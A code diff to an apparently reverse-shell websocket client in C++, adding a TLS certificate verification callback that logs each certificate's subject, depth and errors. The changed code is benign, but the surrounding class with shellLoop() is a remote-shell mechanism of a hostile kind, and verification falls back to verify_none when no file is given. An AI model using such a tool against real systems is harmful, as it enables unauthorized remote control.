@@ -56,6 +56,7 @@ namespace reverseshell
 		void on_interrupt( websocketpp::connection_hdl hdl );
 		void on_message( websocketpp::connection_hdl hdl, client_type::message_ptr );
 		std::shared_ptr<websocketpp::lib::asio::ssl::context> on_tls_init( websocketpp::connection_hdl hdl );
+		bool verify_cert( bool preverified, websocketpp::lib::asio::ssl::verify_context& context );
 		void send( const char* buffer, size_t size );
 		void shellLoop();
 	};
@@ -276,12 +277,24 @@ std::shared_ptr<websocketpp::lib::asio::ssl::context> reverseshell::ClientPrivat
 	{
 		pSSLContext->set_verify_mode( asio::ssl::verify_peer | asio::ssl::verify_fail_if_no_peer_cert );
 		pSSLContext->load_verify_file( verifyFileName_ );
-		//pSSLContext->set_verify_callback( std::bind( &ServerPimple::verify_certificate, this, std::placeholders::_1, std::placeholders::_2 ) );
+		pSSLContext->set_verify_callback( std::bind( &ClientPrivateMembers::verify_cert, this, std::placeholders::_1, std::placeholders::_2 ) );
 	}
 	else pSSLContext->set_verify_mode( asio::ssl::verify_none );
 	if( !diffieHellmanParamsFileName_.empty() ) pSSLContext->use_tmp_dh_file( diffieHellmanParamsFileName_ );
 
 	return pSSLContext;
+}
+
+bool reverseshell::ClientPrivateMembers::verify_cert( bool preverified, websocketpp::lib::asio::ssl::verify_context& context )
+{
+	std::cout << "Verifying certificate '" << X509_NAME_oneline( X509_get_subject_name(X509_STORE_CTX_get_current_cert( context.native_handle() )), nullptr, 0 )
+			<< "' at depth " << X509_STORE_CTX_get_error_depth( context.native_handle() )
+			<< " with preverified=" << preverified << ".";
+	auto error=X509_STORE_CTX_get_error( context.native_handle() );
+	if( error ) std::cout << " Error is '" << X509_verify_cert_error_string(error) << "'";
+	std::cout << std::endl;
+
+	return preverified;
 }
 
 void reverseshell::ClientPrivateMembers::send( const char* buffer, size_t size )
